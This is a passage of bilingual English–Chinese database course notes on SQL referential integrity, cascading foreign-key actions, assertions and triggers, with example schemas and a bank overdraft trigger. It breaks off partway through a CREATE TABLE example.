<p>For example, the following constraint ensures that the <code>branch_name</code> in the <code>employee</code> relation must match the <code>branch_name</code> in the <code>branch</code> relation:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#note-db-sql-__codelineno-112-1"></a><span class="k">Create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">employee</span><span class="w"> </span>
</span><span id="__span-112-2"><a id="__codelineno-112-2" name="__codelineno-112-2" href="#note-db-sql-__codelineno-112-2"></a><span class="p">(</span><span class="n">eno</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="k">primary</span><span class="w"> </span><span class="k">key</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-112-3"><a id="__codelineno-112-3" name="__codelineno-112-3" href="#note-db-sql-__codelineno-112-3"></a><span class="n">ename</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">15</span><span class="p">),</span><span class="w"> </span>
</span><span id="__span-112-4"><a id="__codelineno-112-4" name="__codelineno-112-4" href="#note-db-sql-__codelineno-112-4"></a><span class="n">job</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="w"> </span>
</span><span id="__span-112-5"><a id="__codelineno-112-5" name="__codelineno-112-5" href="#note-db-sql-__codelineno-112-5"></a><span class="n">branch_name</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="w"> </span>
</span><span id="__span-112-6"><a id="__codelineno-112-6" name="__codelineno-112-6" href="#note-db-sql-__codelineno-112-6"></a><span class="k">foreign</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="p">(</span><span class="n">branch_name</span><span class="p">)</span><span class="w"> </span><span class="k">references</span><span class="w"> </span><span class="n">branch</span><span class="p">(</span><span class="n">branch_name</span><span class="p">));</span>
</span></code></pre></div>
<ul>
<li>
<p>INSERT:If a tuple <span class="arithmatex">\(t_2\)</span> is inserted into <span class="arithmatex">\(r_2\)</span>, the system must ensure that there is a tuple <span class="arithmatex">\(t_1\)</span> in <span class="arithmatex">\(r_1\)</span> such that <span class="arithmatex">\(t_1[K_1] = t_2[\alpha]\)</span>, 例如如果插入一个员工，则该员工所属的branch_name必须在branch表中存在。</p>
</li>
<li>
<p>DELETE: If a tuple <span class="arithmatex">\(t_1\)</span> is deleted from <span class="arithmatex">\(r_1\)</span>, the system must compute the set of tuples in <span class="arithmatex">\(r_2\)</span> that reference <span class="arithmatex">\(t_1\)</span>:</p>
</li>
</ul>
<div class="arithmatex">\[
    \sigma_{\alpha = t_1[K_1]}(r_2)
\]</div>
<blockquote>
<p>如果r2中存在与r1中被删记录匹配的元组 </p>
</blockquote>
<p>If this set is not empty, then either the delete command is rejected as an error, or the tuples in <span class="arithmatex">\(t_2\)</span> that references <span class="arithmatex">\(t_1\)</span> must themselves be deleted (cascading deletions are possible). </p>
<p>例如如果删除了一个branch，则所有属于该branch的employee也必须被删除，或者这个删除操作被拒绝。</p>
<ul>
<li>UPDATE CASE 1: If a tuple <span class="arithmatex">\(t_2\)</span> is updated in relation <span class="arithmatex">\(r_2\)</span> and the update modifies values for foreign key <span class="arithmatex">\(\alpha\)</span>, then a test similar to the insert case is made:</li>
</ul>
<p>Let <span class="arithmatex">\(t_2'\)</span> denote the new value of tuple <span class="arithmatex">\(t_2\)</span>. The system must ensure that </p>
<div class="arithmatex">\[
    t_2'[K_1] \in \Pi_{K_1}(r_1)
\]</div>
<p>例如如果更新一个employee的branch_name，则该employee的branch_name必须在branch表中存在。</p>
<ul>
<li>UPDATE CASE 2: If a tuple <span class="arithmatex">\(t_1\)</span> is updated in relation <span class="arithmatex">\(r_1\)</span> and the update modifies values for candidate key <span class="arithmatex">\(K\)</span>, then a test similar to the delete case is made: </li>
</ul>
<p>Either the update command is rejected as an error, or the tuples in <span class="arithmatex">\(t_2\)</span> that references <span class="arithmatex">\(t_1\)</span> must themselves be updated(cascading updates are possible). </p>
<p>例如如果更新了branch里面的branch_name，则所有属于该branch的employee的branch_name也必须被更新，或者拒绝这个更新操作。</p>
<div class="admonition key-point">
<p class="admonition-title">Referential Integrity</p>
<p>Primary, candidate keys, and foreign keys can be specified as part of the SQL create table statement: </p>
<ul>
<li>The primary key clause lists attributes that comprise the primary key. </li>
<li>The unique key clause lists attributes that comprise a candidate key. </li>
<li>The foreign key clause lists the attributes that comprise the foreign key and the name of the relation referenced by the foreign key. </li>
</ul>
<p>EG
<div class="language-sql highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#note-db-sql-__codelineno-113-1"></a><span class="k">Create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">employee</span><span class="w"> </span>
</span><span id="__span-113-2"><a id="__codelineno-113-2" name="__codelineno-113-2" href="#note-db-sql-__codelineno-113-2"></a><span class="p">(</span><span class="n">eno</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="w"> </span>
</span><span id="__span-113-3"><a id="__codelineno-113-3" name="__codelineno-113-3" href="#note-db-sql-__codelineno-113-3"></a><span class="n">ename</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">15</span><span class="p">),</span><span class="w"> </span>
</span><span id="__span-113-4"><a id="__codelineno-113-4" name="__codelineno-113-4" href="#note-db-sql-__codelineno-113-4"></a><span class="n">job</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="w"> </span>
</span><span id="__span-113-5"><a id="__codelineno-113-5" name="__codelineno-113-5" href="#note-db-sql-__codelineno-113-5"></a><span class="n">branch_name</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="w"> </span>
</span><span id="__span-113-6"><a id="__codelineno-113-6" name="__codelineno-113-6" href="#note-db-sql-__codelineno-113-6"></a><span class="k">foreign</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="p">(</span><span class="n">branch_name</span><span class="p">)</span><span class="w"> </span><span class="k">references</span><span class="w"> </span><span class="n">branch</span><span class="p">(</span><span class="n">branch_name</span><span class="p">),</span>
</span><span id="__span-113-7"><a id="__codelineno-113-7" name="__codelineno-113-7" href="#note-db-sql-__codelineno-113-7"></a><span class="k">primary</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="p">(</span><span class="n">eno</span><span class="p">),</span>
</span><span id="__span-113-8"><a id="__codelineno-113-8" name="__codelineno-113-8" href="#note-db-sql-__codelineno-113-8"></a><span class="k">unique</span><span class="w"> </span><span class="p">(</span><span class="n">ename</span><span class="p">));</span>
</span></code></pre></div></p>
<p>By default, a foreign key references the primary key attributes of the referenced table: </p>
<p>E.g., 
<div class="language-sql highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#note-db-sql-__codelineno-114-1"></a><span class="k">foreign</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="p">(</span><span class="n">account</span><span class="o">-</span><span class="nb">number</span><span class="p">)</span><span class="w"> </span><span class="k">references</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-114-2"><a id="__codelineno-114-2" name="__codelineno-114-2" href="#note-db-sql-__codelineno-114-2"></a><span class="c1">--如果不指定，则默认引用account表的primary key</span>
</span></code></pre></div></p>
<p>Short form for specifying a single column as foreign key: 
E.g., 
<div class="language-sql highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#note-db-sql-__codelineno-115-1"></a><span class="n">account</span><span class="o">-</span><span class="nb">number</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="k">references</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-115-2"><a id="__codelineno-115-2" name="__codelineno-115-2" href="#note-db-sql-__codelineno-115-2"></a><span class="c1">-- 简写，指定account-number为外码</span>
</span></code></pre></div></p>
<p>Reference columns in the referenced table can be explicitly specified</p>
<p>but must be declared as primary/candidate keys: 
<div class="language-sql highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#note-db-sql-__codelineno-116-1"></a><span class="k">foreign</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="p">(</span><span class="n">account</span><span class="o">-</span><span class="nb">number</span><span class="p">)</span><span class="w"> </span><span class="k">references</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="p">(</span><span class="n">account</span><span class="o">-</span><span class="nb">number</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-116-2"><a id="__codelineno-116-2" name="__codelineno-116-2" href="#note-db-sql-__codelineno-116-2"></a>
</span><span id="__span-116-3"><a id="__codelineno-116-3" name="__codelineno-116-3" href="#note-db-sql-__codelineno-116-3"></a><span class="c1">-- 指定account-number为外码，并引用account表的account-number，也可以使用不同的名字，例如</span>
</span><span id="__span-116-4"><a id="__codelineno-116-4" name="__codelineno-116-4" href="#note-db-sql-__codelineno-116-4"></a>
</span><span id="__span-116-5"><a id="__codelineno-116-5" name="__codelineno-116-5" href="#note-db-sql-__codelineno-116-5"></a><span class="k">foreign</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="p">(</span><span class="n">account</span><span class="o">-</span><span class="nb">number</span><span class="p">)</span><span class="w"> </span><span class="k">references</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="p">(</span><span class="n">acnum</span><span class="p">)</span><span class="w"> </span>
</span></code></pre></div></p>
</div>
<div class="admonition info">
<p class="admonition-title">Cascading actions</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#note-db-sql-__codelineno-117-1"></a><span class="k">Create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="p">(</span><span class="w"> </span>
</span><span id="__span-117-2"><a id="__codelineno-117-2" name="__codelineno-117-2" href="#note-db-sql-__codelineno-117-2"></a><span class="w">        </span><span class="p">.</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="p">.</span><span class="w"> </span>
</span><span id="__span-117-3"><a id="__codelineno-117-3" name="__codelineno-117-3" href="#note-db-sql-__codelineno-117-3"></a><span class="k">foreign</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="p">(</span><span class="n">branch</span><span class="o">-</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="k">references</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span>
</span><span id="__span-117-4"><a id="__codelineno-117-4" name="__codelineno-117-4" href="#note-db-sql-__codelineno-117-4"></a><span class="w">    </span><span class="p">[</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="k">delete</span><span class="w"> </span><span class="k">cascade</span><span class="p">]</span><span class="w"> </span>
</span><span id="__span-117-5"><a id="__codelineno-117-5" name="__codelineno-117-5" href="#note-db-sql-__codelineno-117-5"></a><span class="w">    </span><span class="p">[</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="k">update</span><span class="w"> </span><span class="k">cascade</span><span class="w"> </span><span class="p">]</span><span class="w"> </span>
</span><span id="__span-117-6"><a id="__codelineno-117-6" name="__codelineno-117-6" href="#note-db-sql-__codelineno-117-6"></a><span class="w">    </span><span class="p">.</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="p">);</span><span class="w"> </span>
</span></code></pre></div>
<p>加了on delete cascade，如果branch表中删除了一个元组，则account表中所有引用该branch的元组也会被删除。</p>
<p>加了on update cascade，如果branch表中更新了一个元组的branch-name，则account表中所有引用该branch的元组也会被更新。</p>
<p>如果在多个关系之间存在一系列的外键依赖关系，并且每个依赖关系都指定了on delete cascade，那么在链的一端进行的删除或更新操作可以传播到整个链。</p>
<p>但是，如果级联更新或删除导致了一个无法通过进一步级联操作来处理的约束违反，系统将会中止该事务。</p>
<p>As a result, all the changes caused by the transaction and its cascading actions are undone. </p>
<p>在 SQL 中，外键约束用于维护表之间的参照完整性。除了级联删除（<code>ON DELETE CASCADE</code>）之外，还有其他选项可以在删除被引用的记录时指定外键的行为：</p>
<ol>
<li>
<p><strong><code>ON DELETE SET NULL</code></strong> : 当被引用的记录被删除时，将外键列的值设置为 <code>NULL</code>。这意味着如果一个记录在被引用的表中被删除，那么在引用表中所有引用该记录的外键列将被设置为 <code>NULL</code>。</p>
</li>
<li>
<p><strong><code>ON DELETE SET DEFAULT</code></strong> : 当被引用的记录被删除时，将外键列的值设置为一个默认值。这个默认值必须在创建表时定义。</p>
</li>
</ol>
<p>关于外键属性中的空值（<code>NULL</code>）：</p>
<ul>
<li>如果外键的任何属性为 <code>NULL</code>，则该元组被定义为满足外键约束。这是因为 <code>NULL</code> 表示未知或不适用，因此 SQL 允许外键列包含 <code>NULL</code> 值，而不违反参照完整性。</li>
</ul>
<p>然而，外键属性中的 <code>NULL</code> 值会使 SQL 的参照完整性语义变得复杂。因此，通常建议使用 <code>NOT NULL</code> 约束来防止外键属性中出现 <code>NULL</code> 值，以确保数据的一致性和完整性。</p>
<p>例如：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#note-db-sql-__codelineno-118-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">orders</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#note-db-sql-__codelineno-118-2"></a><span class="w">    </span><span class="n">order_id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#note-db-sql-__codelineno-118-3"></a><span class="w">    </span><span class="n">customer_id</span><span class="w"> </span><span class="nb">INT</span><span class="p">,</span>
</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4" href="#note-db-sql-__codelineno-118-4"></a><span class="w">    </span><span class="k">FOREIGN</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="p">(</span><span class="n">customer_id</span><span class="p">)</span><span class="w"> </span><span class="k">REFERENCES</span><span class="w"> </span><span class="n">customers</span><span class="p">(</span><span class="n">id</span><span class="p">)</span>
</span><span id="__span-118-5"><a id="__codelineno-118-5" name="__codelineno-118-5" href="#note-db-sql-__codelineno-118-5"></a><span class="w">    </span><span class="k">ON</span><span class="w"> </span><span class="k">DELETE</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="k">NULL</span>
</span><span id="__span-118-6"><a id="__codelineno-118-6" name="__codelineno-118-6" href="#note-db-sql-__codelineno-118-6"></a><span class="p">);</span>
</span></code></pre></div>
<p>在这个例子中，如果 <code>customers</code> 表中的某个 <code>id</code> 被删除，那么 <code>orders</code> 表中所有引用该 <code>id</code> 的 <code>customer_id</code> 列将被设置为 <code>NULL</code>。</p>
</div>
<div class="admonition idea">
<p class="admonition-title">Idea</p>
<p>参照完整性只在事务结束时才会被检查</p>
<p>也就是说：在事务执行过程中的中间步骤允许违反参照完整性，只要在事务结束时这些违反被消除即可。</p>
<p>否则，某些数据库状态将无法创建，例如：插入两个相互引用的元组（它们的外键互相指向对方）</p>
</div>
<h4 id="note-db-sql-assertions">Assertions<a class="headerlink" href="#note-db-sql-assertions" title="Permanent link">&para;</a></h4>
<p>An assertion is a predicate expressing a condition that we wish the database always to satisfy. --- for complex check condition on several relations! </p>
<p>Format:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#note-db-sql-__codelineno-119-1"></a><span class="k">Create</span><span class="w"> </span><span class="k">assertion</span><span class="w"> </span><span class="k">constraint_name</span><span class="w"> </span><span class="k">check</span><span class="w"> </span><span class="o">&lt;</span><span class="n">condition</span><span class="o">&gt;</span><span class="p">;</span>
</span></code></pre></div></p>
<p>When an assertion is made, the system tests it for validity on every update that may violate the assertion. (when the predicate is true, it is Ok, otherwise report error.) </p>
<p>这种测试可能会带来大量的系统开销；因此，断言应该谨慎使用。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>if we require "the sum of all loan amounts for each branch must be less than the sum of all account balances at the branch". </p>
<p>But SQL does not provide a construct for asserting: 
<div class="language-sql highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#note-db-sql-__codelineno-120-1"></a><span class="k">for</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="n">X</span><span class="p">,</span><span class="w"> </span><span class="n">P</span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w"> </span>
</span></code></pre></div>
So it is achieved in a round-about fashion, using: </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#note-db-sql-__codelineno-121-1"></a><span class="k">not</span><span class="w"> </span><span class="k">exists</span><span class="w"> </span><span class="n">X</span><span class="p">,</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">P</span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">  </span>
</span></code></pre></div>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#note-db-sql-__codelineno-122-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">ASSERTION</span><span class="w"> </span><span class="k">sum</span><span class="o">-</span><span class="k">constraint</span><span class="w"> </span><span class="k">CHECK</span>
</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#note-db-sql-__codelineno-122-2"></a><span class="w">    </span><span class="p">(</span><span class="k">NOT</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="n">B</span>
</span><span id="__span-122-3"><a id="__codelineno-122-3" name="__codelineno-122-3" href="#note-db-sql-__codelineno-122-3"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span>
</span><span id="__span-122-4"><a id="__codelineno-122-4" name="__codelineno-122-4" href="#note-db-sql-__codelineno-122-4"></a><span class="w">    </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">SUM</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">loan</span>
</span><span id="__span-122-5"><a id="__codelineno-122-5" name="__codelineno-122-5" href="#note-db-sql-__codelineno-122-5"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">loan</span><span class="p">.</span><span class="n">branch</span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">B</span><span class="p">.</span><span class="n">branch</span><span class="o">-</span><span class="n">name</span><span class="p">)</span>
</span><span id="__span-122-6"><a id="__codelineno-122-6" name="__codelineno-122-6" href="#note-db-sql-__codelineno-122-6"></a><span class="w">    </span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">SUM</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span>
</span><span id="__span-122-7"><a id="__codelineno-122-7" name="__codelineno-122-7" href="#note-db-sql-__codelineno-122-7"></a><span class="w">      </span><span class="k">WHERE</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">branch</span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">B</span><span class="p">.</span><span class="n">branch</span><span class="o">-</span><span class="n">name</span><span class="p">)</span>
</span><span id="__span-122-8"><a id="__codelineno-122-8" name="__codelineno-122-8" href="#note-db-sql-__codelineno-122-8"></a><span class="w">      </span><span class="p">)</span>
</span><span id="__span-122-9"><a id="__codelineno-122-9" name="__codelineno-122-9" href="#note-db-sql-__codelineno-122-9"></a><span class="w">    </span><span class="p">);</span>
</span></code></pre></div>
</div>
<h4 id="note-db-sql-triggers">Triggers<a class="headerlink" href="#note-db-sql-triggers" title="Permanent link">&para;</a></h4>
<p>A trigger is a statement that is executed automatically by the system as a side-effect of a modification to the database. </p>
<p>To design a trigger mechanism, we must: </p>
<ol>
<li>Specify the conditions under which the trigger is to be executed. </li>
<li>Specify the actions to be taken when the trigger executes. </li>
</ol>
<blockquote>
<p>Triggers were introduced to SQL standard in SQL:1999, but supported even earlier using non-standard syntax by most databases. </p>
</blockquote>
<p>Format:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#note-db-sql-__codelineno-123-1"></a><span class="k">Create</span><span class="w"> </span><span class="k">trigger</span><span class="w"> </span><span class="k">trigger_name</span>
</span><span id="__span-123-2"><a id="__codelineno-123-2" name="__codelineno-123-2" href="#note-db-sql-__codelineno-123-2"></a><span class="err">{</span><span class="k">before</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">after</span><span class="err">}</span><span class="w"> </span><span class="err">{</span><span class="k">insert</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">delete</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">update</span><span class="err">}</span><span class="w"> </span><span class="p">[</span><span class="k">of</span><span class="w"> </span><span class="n">attribute_name</span><span class="p">]</span>
</span><span id="__span-123-3"><a id="__codelineno-123-3" name="__codelineno-123-3" href="#note-db-sql-__codelineno-123-3"></a><span class="k">on</span><span class="w"> </span><span class="n">relation_name</span>
</span><span id="__span-123-4"><a id="__codelineno-123-4" name="__codelineno-123-4" href="#note-db-sql-__codelineno-123-4"></a><span class="p">[</span><span class="k">for</span><span class="w"> </span><span class="k">each</span><span class="w"> </span><span class="k">row</span><span class="p">]</span>
</span><span id="__span-123-5"><a id="__codelineno-123-5" name="__codelineno-123-5" href="#note-db-sql-__codelineno-123-5"></a><span class="p">[</span><span class="k">when</span><span class="w"> </span><span class="p">(</span><span class="n">condition</span><span class="p">)]</span>
</span><span id="__span-123-6"><a id="__codelineno-123-6" name="__codelineno-123-6" href="#note-db-sql-__codelineno-123-6"></a><span class="k">begin</span>
</span><span id="__span-123-7"><a id="__codelineno-123-7" name="__codelineno-123-7" href="#note-db-sql-__codelineno-123-7"></a><span class="w">    </span><span class="o">&lt;</span><span class="n">action</span><span class="o">&gt;</span>
</span><span id="__span-123-8"><a id="__codelineno-123-8" name="__codelineno-123-8" href="#note-db-sql-__codelineno-123-8"></a><span class="k">end</span><span class="p">;</span>
</span></code></pre></div></p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>触发器可以限制在特定属性的更新上：
例如：
<div class="language-sql highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#note-db-sql-__codelineno-124-1"></a><span class="k">Create</span><span class="w"> </span><span class="k">trigger</span><span class="w"> </span><span class="n">overdraft</span><span class="o">-</span><span class="k">trigger</span><span class="w"> </span>
</span><span id="__span-124-2"><a id="__codelineno-124-2" name="__codelineno-124-2" href="#note-db-sql-__codelineno-124-2"></a><span class="w">            </span><span class="k">after</span><span class="w"> </span><span class="k">update</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="err">…</span><span class="w"> </span>
</span></code></pre></div></p>
<p>更新前后的属性值可以被引用：
Referencing old row as：用于删除和更新操作
Referencing new row as：用于插入和更新操作</p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Suppose that instead of allowing negative account balances, the bank deals with overdrafts by (the actions): </p>
<ul>
<li>Setting the account balance to zero </li>
<li>Creating a loan in the amount of the overdraft, giving this loan a loan number identical to the account number of the overdrawn account </li>
</ul>
<p>The condition for executing the trigger is an update to the account relation that results in a negative balance value. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#note-db-sql-__codelineno-125-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TRIGGER</span><span class="w"> </span><span class="n">overdraft</span><span class="o">-</span><span class="k">trigger</span><span class="w"> </span><span class="k">after</span><span class="w"> </span><span class="k">update</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-125-2"><a id="__codelineno-125-2" name="__codelineno-125-2" href="#note-db-sql-__codelineno-125-2"></a><span class="w">    </span><span class="k">referencing</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">nrow</span><span class="w"> </span>
</span><span id="__span-125-3"><a id="__codelineno-125-3" name="__codelineno-125-3" href="#note-db-sql-__codelineno-125-3"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="k">each</span><span class="w"> </span><span class="k">row</span><span class="w"> </span>
</span><span id="__span-125-4"><a id="__codelineno-125-4" name="__codelineno-125-4" href="#note-db-sql-__codelineno-125-4"></a><span class="w">    </span><span class="k">when</span><span class="w"> </span><span class="n">nrow</span><span class="p">.</span><span class="n">balance</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span>
</span><span id="__span-125-5"><a id="__codelineno-125-5" name="__codelineno-125-5" href="#note-db-sql-__codelineno-125-5"></a><span class="k">begin</span><span class="w"> </span><span class="k">atomic</span><span class="w"> </span>
</span><span id="__span-125-6"><a id="__codelineno-125-6" name="__codelineno-125-6" href="#note-db-sql-__codelineno-125-6"></a><span class="w">    </span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">borrower</span><span class="w"> </span>
</span><span id="__span-125-7"><a id="__codelineno-125-7" name="__codelineno-125-7" href="#note-db-sql-__codelineno-125-7"></a><span class="w">        </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">customer_name</span><span class="p">,</span><span class="w"> </span><span class="n">account_number</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span>
</span><span id="__span-125-8"><a id="__codelineno-125-8" name="__codelineno-125-8" href="#note-db-sql-__codelineno-125-8"></a><span class="w">        </span><span class="k">where</span><span class="w"> </span><span class="n">nrow</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">depositor</span><span class="p">.</span><span class="n">account_number</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-125-9"><a id="__codelineno-125-9" name="__codelineno-125-9" href="#note-db-sql-__codelineno-125-9"></a><span class="w">    </span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span><span class="k">values</span><span class="w"> </span>
</span><span id="__span-125-10"><a id="__codelineno-125-10" name="__codelineno-125-10" href="#note-db-sql-__codelineno-125-10"></a><span class="w">        </span><span class="p">(</span><span class="n">nrow</span><span class="p">.</span><span class="n">account_number</span><span class="p">,</span><span class="w"> </span><span class="n">nrow</span><span class="p">.</span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">nrow</span><span class="p">.</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-125-11"><a id="__codelineno-125-11" name="__codelineno-125-11" href="#note-db-sql-__codelineno-125-11"></a><span class="w">    </span><span class="k">update</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span>
</span><span id="__span-125-12"><a id="__codelineno-125-12" name="__codelineno-125-12" href="#note-db-sql-__codelineno-125-12"></a><span class="w">        </span><span class="k">where</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nrow</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span>
</span><span id="__span-125-13"><a id="__codelineno-125-13" name="__codelineno-125-13" href="#note-db-sql-__codelineno-125-13"></a><span class="k">end</span><span class="w"> </span>
</span></code></pre></div>
</div>
<div class="admonition info">
<p class="admonition-title">Statement Level Triggers</p>
<p>Instead of executing a separate action for each affected row, a single action can be executed for all rows affected by a transaction. </p>
<ul>
<li>Use for each statement instead of for each row </li>
<li>Use referencing old table or referencing new table to refer to temporary tables  (called transition tables) containing the affected rows </li>
<li>Can be more efficient when dealing with SQL statements that update a large number of rows </li>
</ul>
<p>当然，这里有一个使用语句级触发器的示例。假设我们有一个 <code>orders</code> 表，我们希望在更新订单状态时记录所有受影响订单的日志。</p>
<p>表结构</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#note-db-sql-__codelineno-126-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">orders</span><span class="w"> </span><span class="p">(</span>
